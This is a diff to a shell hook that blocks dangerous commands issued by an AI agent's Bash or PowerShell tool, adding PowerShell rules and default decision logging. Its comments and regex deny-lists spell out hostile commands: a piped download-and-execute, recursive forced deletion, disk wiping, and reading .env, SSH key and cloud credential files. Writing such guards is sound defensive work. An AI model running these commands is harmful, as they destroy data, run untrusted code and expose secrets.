@@ -103,15 +103,43 @@ fi
 PERM_MODE="${PERM_MODE:-}"
 [ -z "$CMD" ] && exit 0
 
-# Gate observability, ABSENT unless the operator exports CSK_GATE_LOG. A gate that cannot be seen firing cannot
-# be measured: "the model never reached for the command" and "the gate stopped it" leave behind exactly the same
-# artifacts, and the A/B harness spent a whole case (evals/permission-pressure) unable to tell them apart — it
-# had to report "guard-bash never fired" as an inference. One TSV line per decision, write-only, and it never
-# touches the decision itself: every call site logs AFTER the verdict is settled.
-gatelog(){  # $1 = verdict (BLOCK|ASK)  $2 = section  $3 = rule
-  [ -n "${CSK_GATE_LOG:-}" ] || return 0
-  printf '%s\t§%s\t%s\t%s\n' "$1" "$2" "$3" \
-    "$(printf '%s' "$CMD" | tr -d '\000-\037' | cut -c1-200)" >> "$CSK_GATE_LOG" 2>/dev/null || true
+# Gate observability. A gate that cannot be seen firing cannot be measured: "the model never reached for the
+# command" and "the gate stopped it" leave behind exactly the same artifacts, and the A/B harness spent a whole
+# case (evals/permission-pressure) unable to tell them apart — it had to report "guard-bash never fired" as an
+# inference. One TSV line per decision, write-only, and it never touches the decision itself: every call site
+# logs AFTER the verdict is settled.
+#
+# ON BY DEFAULT since 2.5.0, into .claude/gate-log.tsv — an evidence channel nobody switches on records nothing,
+# and "the gates hold" is a claim that needs a record, not a test suite alone. CSK_GATE_LOG overrides the path;
+# CSK_GATE_LOG=/dev/null (or a read-only .claude) turns it off. Only BLOCK/ASK decisions reach here, so an
+# ordinary command writes nothing.
+#
+# The COMMAND TEXT IS NOT RECORDED by default. It is the one field that can carry a path, an argument or a
+# token, and `/gates-csk` never prints it — the report is rule names and counts. Recording it by default would
+# buy nothing and add a place for a secret to sit. `CSK_GATE_LOG_CMD=1` puts it back for debugging a false
+# positive, which is the only thing it is good for.
+# Where the default log may go. An explicit CSK_GATE_LOG is the operator's call and is used as given. The
+# DEFAULT path is only used when writing there cannot surprise anyone: outside a git repo, or inside one where
+# the path is already ignored. A kit install gitignores .claude/, so this is the normal case — but the plugin
+# edition drops into repos the installer never touched, and this repo proved the failure itself: the suite left
+# a gate-log.tsv sitting in `git status` as an untracked file waiting to be committed. One `git check-ignore`
+# runs only when a gate actually fires (never on an allowed command), so the hot path is untouched.
+_gatelog_path(){
+  if [ -n "${CSK_GATE_LOG:-}" ]; then printf '%s' "$CSK_GATE_LOG"; return; fi
+  [ -d ".claude" ] || return 0
+  if git rev-parse --is-inside-work-tree >/dev/null 2>&1; then
+    git check-ignore -q ".claude/gate-log.tsv" 2>/dev/null || return 0
+  fi
+  printf '%s' ".claude/gate-log.tsv"
+}
+gatelog(){  # $1 = verdict (BLOCK|ASK|ALLOW)  $2 = section  $3 = rule
+  _GL="$(_gatelog_path)"; [ -n "$_GL" ] || return 0
+  if [ "${CSK_GATE_LOG_CMD:-0}" = 1 ]; then
+    printf '%s\t§%s\t%s\t%s\n' "$1" "$2" "$3" \
+      "$(printf '%s' "$CMD" | tr -d '\000-\037' | cut -c1-200)" >> "$_GL" 2>/dev/null || true
+  else
+    printf '%s\t§%s\t%s\t\n' "$1" "$2" "$3" >> "$_GL" 2>/dev/null || true
+  fi
 }
 
 block(){
@@ -176,6 +204,34 @@ echo "$CMD" | grep -qE '(^|[^a-zA-Z])dd[[:space:]]+([^|]*[[:space:]])?of='  && b
 # each of those carries its own case in smoke-test §7, because a gate this repo cannot prove is not a gate.
 echo "$CMD" | grep -qE '(^|[^a-zA-Z])chmod[[:space:]]+(-[A-Za-z]*[[:space:]]+)*([0-7]?[0-7][0-7][2367]|[ugoa]*[oa][ugoa]*[+=][rwxXst]*w[rwxXst]*|a=?\+?rwx|\+rwx)([[:space:]]|$)' && block "chmod world-writable (777/1777/666/o+w …)" "4.5"
 
+# §4.5 PowerShell equivalents -> HARD BLOCK. The PowerShell tool sends the SAME payload shape (tool_input.command)
+# and Claude Code's own hooks reference says to match `Bash|PowerShell`, because on Windows wherever that tool is
+# enabled PowerShell IS the shell — and with no Git Bash the Bash tool is never registered at all. The git rules
+# above already carry over (git's syntax does not change), but every POSIX-shaped rule below them missed its
+# PowerShell twin. Measured on this payload before the rules existed: `Remove-Item -Recurse -Force C:\proj\*`,
+# `rm -Recurse -Force .`, `irm https://x/i.ps1 | iex` and `Get-Content .env` all returned rc=0 — allowed.
+#
+# Two PowerShell facts these patterns are built on:
+#   * parameters match on any unambiguous PREFIX, so -Recurse is also -Rec/-r and -Force is also -Fo/-f;
+#   * the destructive verbs have short aliases (rm/del/erase/rd/ri for Remove-Item), and `rm` there is
+#     Remove-Item, not POSIX rm — the same word with different flags, which is why the POSIX rule misses it.
+PS_RM='(remove-item|ri|rm|rmdir|rd|del|erase)'
+PS_RECURSE='-r(e(c(u(r(s(e)?)?)?)?)?)?([[:space:]]|$)'
+PS_FORCE='-f(o(r(c(e)?)?)?)?([[:space:]]|$)'
+# Recursive+forced removal aimed at a glob, a drive root, a UNC path, or $HOME — the shapes that take a tree out.
+{ has "(^|[^A-Za-z0-9_-])$PS_RM[[:space:]]" && has "$PS_RECURSE" && has "$PS_FORCE" \
+  && has '(\*|[A-Za-z]:\\|\\\\|\$HOME|\$env:USERPROFILE|~)'; } \
+  && block "PowerShell recursive force delete (Remove-Item -Recurse -Force)" "4.5"
+# Download-and-execute, the PowerShell shape of curl|bash: any fetcher piped into Invoke-Expression.
+echo "$CMD" | grep -qiE '(invoke-webrequest|iwr|invoke-restmethod|irm|curl|wget)[^|]*\|[[:space:]]*(invoke-expression|iex)([[:space:]]|$)' \
+  && block "PowerShell download-and-execute (… | iex)" "4.5"
+# Disk-level destruction. No POSIX equivalent of these names, so the mkfs/dd rule never saw them.
+echo "$CMD" | grep -qiE '(^|[^A-Za-z0-9_-])(format-volume|clear-disk|remove-partition|initialize-disk|set-disk)([[:space:]]|$)' \
+  && block "PowerShell disk-level destructive command" "4.5"
+# World-writable ACL: icacls is what chmod 777 looks like on Windows.
+echo "$CMD" | grep -qiE '(^|[^A-Za-z0-9_-])icacls\b[^;&|]*/grant[^;&|]*(everyone|users|authenticated users)[^;&|]*:\(?[^)]*[FM]' \
+  && block "PowerShell world-writable ACL (icacls /grant Everyone:F)" "4.5"
+
 # §4.5 gate-tampering -> HARD BLOCK. A gate you can silently remove is not a gate: redirecting core.hooksPath,
 # or deleting/overwriting/patching the hook scripts, would disarm the trace/secret/approval gates in one line.
 echo "$CMD" | grep -qE 'git[[:space:]]+config\b[^|]*core\.hooksPath'                       && block "git config core.hooksPath (disarms the git hooks)" "4.5"
@@ -196,7 +252,7 @@ GATE='\.(claude/(hooks|settings\.json)|git/hooks)'
 # to route around. A verb in one command and a path in another was never evidence of anything: the two forms
 # that matter — `rm .claude/hooks/x` and `x > .claude/hooks/y` — both put them in the SAME segment, and both
 # are still blocked (asserted in smoke-test, in both directions).
-echo "$CMD" | grep -qiE "(rm|mv|cp|truncate|tee|install|ln|perl|python[0-9.]*|ruby|node|ex|ed)\b[^;&|]*$GATE" && block "write/tamper of a gate file (hook/settings/.git-hooks)" "4.5"
+echo "$CMD" | grep -qiE "(rm|mv|cp|truncate|tee|install|ln|perl|python[0-9.]*|ruby|node|ex|ed|set-content|add-content|clear-content|out-file|new-item|rename-item|copy-item|move-item|remove-item)\b[^;&|]*$GATE" && block "write/tamper of a gate file (hook/settings/.git-hooks)" "4.5"
 echo "$CMD" | grep -qiE "(sed|perl|awk|ruby)[[:space:]]+(-[^[:space:]]+[[:space:]]+)*-i[^;&|]*$GATE"          && block "in-place edit of a gate file" "4.5"
 # The redirect TARGET must be the gate path, not merely something later on the line: a target is one token, so
 # it cannot contain whitespace or a command separator.
@@ -207,7 +263,13 @@ echo "$CMD" | grep -qiE ">[[:space:]]*['\"]?[^[:space:];&|<>]*$GATE"            
 # `cat .env` would surface them. Block the direct-file readers/copiers and a `< .env` input redirect on a
 # .env / .env.<env> file; the templates (.env.example/.sample/.template/.dist) stay readable. Arg-taking readers
 # (grep/awk/sed) are deliberately excluded — there a `.env` token is usually a search pattern, not the file.
-{ { has '(^|[^A-Za-z0-9_/.-])(cat|less|more|head|tail|tac|nl|xxd|od|strings|hexdump|base64|sort|uniq|cp|scp|rsync)[[:space:]]+(-[^;&|[:space:]]*[[:space:]]+)*([^;&|[:space:]]*/)?\.env(\.[A-Za-z0-9_-]+)?([[:space:]]|$|[;&|>])' \
+# The PowerShell readers sit in the SAME alternation rather than in a rule of their own: one concern, one rule.
+# `cat` was already here and happens to be a PowerShell alias for Get-Content, which is exactly how this gap
+# stayed invisible — the alias worked, so the rule looked like it covered PowerShell while Get-Content/gc/type
+# walked straight through.
+# `Select-String`/`sls` is left OUT on purpose, for the same reason grep/awk/sed are: it takes the pattern
+# first, so `.env` on that line is as likely to be what is being searched for as what is being searched.
+{ { has '(^|[^A-Za-z0-9_/.-])(cat|less|more|head|tail|tac|nl|xxd|od|strings|hexdump|base64|sort|uniq|cp|scp|rsync|get-content|gc|type|get-item|gi)[[:space:]]+(-[^;&|[:space:]]*[[:space:]]+)*([^;&|[:space:]]*/)?\.env(\.[A-Za-z0-9_-]+)?([[:space:]]|$|[;&|>])' \
     || has '<[[:space:]]*([^;&|[:space:]]*/)?\.env(\.[A-Za-z0-9_-]+)?([[:space:]]|$|[;&|])'; } \
     && ! has '\.env\.(example|sample|template|dist)([^A-Za-z0-9_-]|$)'; } \
     && block "reading a .env secret via the Bash tool" "4.5"
@@ -218,7 +280,7 @@ echo "$CMD" | grep -qiE ">[[:space:]]*['\"]?[^[:space:];&|<>]*$GATE"            
 # commit, nothing downstream scans for that. Reader verbs only (grep/awk/sed still take these as patterns), and
 # a PUBLIC key or a .pub/.example path stays readable because neither is a secret.
 CRED='(\.ssh/(id_[A-Za-z0-9_]+|identity)|(^|/)id_(rsa|dsa|ecdsa|ed25519)|\.aws/credentials|\.netrc|\.git-credentials|\.docker/config\.json|\.npmrc|\.pypirc|kube/config|kubeconfig|\.(pem|p12|pfx|keystore|jks)|service-account.*\.json)'
-{ { has "(^|[^A-Za-z0-9_/.-])(cat|less|more|head|tail|tac|nl|xxd|od|strings|hexdump|base64|cp|scp|rsync|curl|wget)[[:space:]]+(-[^;&|[:space:]]*[[:space:]]+)*[^;&|[:space:]]*$CRED" \
+{ { has "(^|[^A-Za-z0-9_/.-])(cat|less|more|head|tail|tac|nl|xxd|od|strings|hexdump|base64|cp|scp|rsync|curl|wget|get-content|gc|type|get-item|gi)[[:space:]]+(-[^;&|[:space:]]*[[:space:]]+)*[^;&|[:space:]]*$CRED" \
     || has "<[[:space:]]*[^;&|[:space:]]*$CRED"; } \
     && ! has '(\.pub|\.example|\.sample|\.template)([^A-Za-z0-9_-]|$)'; } \
     && block "reading a private key / credential file via the Bash tool" "4.5"
